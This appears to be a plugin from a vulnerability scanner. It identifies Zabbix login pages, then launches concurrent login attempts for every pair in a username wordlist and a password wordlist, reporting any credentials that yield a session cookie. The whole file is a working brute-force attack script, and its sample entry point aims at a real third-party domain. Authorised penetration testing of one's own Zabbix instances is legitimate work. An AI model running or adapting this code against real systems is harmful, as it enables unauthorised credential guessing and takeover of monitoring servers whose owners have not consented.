#!/usr/bin/env python3

import asyncio
from app.lib.common import get_useragent
from app.lib.request import request

class Zabbix_Weakpwd_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Zabbix弱口令漏洞',
            'description': 'Zabbix弱口令漏洞',
            'date': '',
            'exptype': 'check',
            'type': 'Weakpwd'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            'User-Agent': get_useragent(),
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    
    async def handle(self, url, data, user, pwd):
        
        """
        发送请求,判断内容

        :param str url: 请求url
        :param str data: 请求的数据
        :param str user: 用户名
        :param str pwd: 密码

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            req = await request.post(url, headers = self.headers, data = data)
            if 'zbx_sessionid' in req.headers['Set-Cookie'] and req.status == 302:
                result = "user: %s, pwd: %s"%(user, pwd)
                return True, '存在Zabbix弱口令漏洞,弱口令为: ' + result
        except Exception as e:
            # print(e)
            pass

    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
       
        finger_req = await request.get(self.url, headers = self.headers)
        if '<title>Zabbix</title>' in await finger_req.text():
            urls = []
            urls.append(self.url + '/index.php')
            urls.append(self.url + '/zabbix/index.php')
            tasks = []
            for user in open('app/data/username.txt', 'r', encoding = 'utf-8').readlines():
                user = user.strip()
                for pwd in open('app/data/password.txt', 'r', encoding = 'utf-8').readlines():
                    if pwd != '':
                        pwd = pwd.strip()
                    for url in urls:
                        data = {
                            'sid': '84fc9ff1d9310695',
                            'form_refresh': 1,
                            'name': user,
                            'password': pwd,
                            'autologin': 1,
                            'enter': 'Sign in'
                        }
                        task = asyncio.create_task(self.handle(url, data, user, pwd))
                        tasks.append(task)
            
            results = await asyncio.gather(*tasks)
            for result in results:
                if result:
                    return True, result[1]

if __name__ == '__main__':
    Zabbix_Weakpwd = Zabbix_Weakpwd_BaseVerify('http://baidu.com')
    Zabbix_Weakpwd.check()